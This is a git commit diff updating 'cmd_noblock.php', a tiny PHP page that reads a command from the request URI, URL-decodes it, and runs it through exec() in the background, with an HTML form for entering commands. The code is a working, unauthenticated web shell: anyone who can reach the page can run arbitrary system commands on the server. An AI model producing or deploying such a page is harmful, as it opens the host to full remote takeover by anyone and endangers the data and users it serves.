780747776d2b427e0785f8d0a3f9648ea3ccb6ba
laiyuantemp <100673133+laiyuantemp@users.noreply.github.com>
2022-08-16 14:08:21 +0800

    Update cmd_noblock.php

--- cmd_noblock.php
+++ cmd_noblock.php
@@ -1,10 +1,10 @@
 <?php
-  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], " ", 1)+1);
+  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "=", 1)+1);
   $cmd = urldecode($cmd);
   exec($cmd." >log.txt 2>&1 &");
 ?>
 <form action="/cmd_noblock.php">
-  <input type="text" placeholder="command">
+  <input type="text" placeholder="command" name=" ">
   <button type="submit">submit</button>
 </form>
 <br>
